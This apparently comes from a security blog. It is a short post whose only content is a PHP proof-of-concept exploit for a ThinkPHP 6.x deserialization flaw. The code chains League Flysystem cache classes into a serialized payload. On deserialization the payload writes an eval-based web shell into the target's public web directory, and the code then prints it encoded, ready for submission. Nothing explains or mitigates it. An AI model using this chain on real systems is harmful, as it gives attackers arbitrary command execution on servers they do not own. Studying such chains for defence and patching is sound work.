---
title: ThinkPHP6.x反序列化POC
date: 2025-04-14 10:33:52
tags:
- thinkphp
- 反序列化
- PoC
categories:
  - [漏洞分析]
description: 本文提供了ThinkPHP6.x反序列化POC
---
```php
<?php
namespace League\Flysystem\Adapter{
    abstract class AbstractAdapter{
        protected $pathPrefix;
        function __construct()
        {
            $this->pathPrefix = '';
        }

    }

    class Local extends AbstractAdapter
    {

    }
}

namespace League\Flysystem\Cached\Storage{
    use League\Flysystem\Adapter\Local;

    abstract class AbstractCache{
        protected $autosave = false;
//        protected $complete = [];
//        protected $expire = null;
        protected $cache = [];
        public function __construct()
        {
            $this -> autosave = false;
//            $this -> complete = ['armandheddd' => 'sdkfjdslfjsl'];
//            $this -> expire = 'noipi';
            $this -> cache = ["payload" => "\<?php @eval(\$_REQUEST[cmd])?>"];


        }
    }

    class Adapter extends AbstractCache {

        /**
         * Adapter constructor.
         */
        protected $file;
        protected $adapter;
        public function __construct()
        {
            parent::__construct();
            $this -> adapter = new Local();
            $this -> file = 'D:/phpstudy_pro/WWW/tp/public/armandhenewpy.php';
        }

    }
}

namespace app\controller{
    use League\Flysystem\Cached\Storage\Adapter;
    class createPayload{
        public function createpayload(){
            echo urlencode(base64_encode(serialize(new Adapter())));
        }
    }

}
```
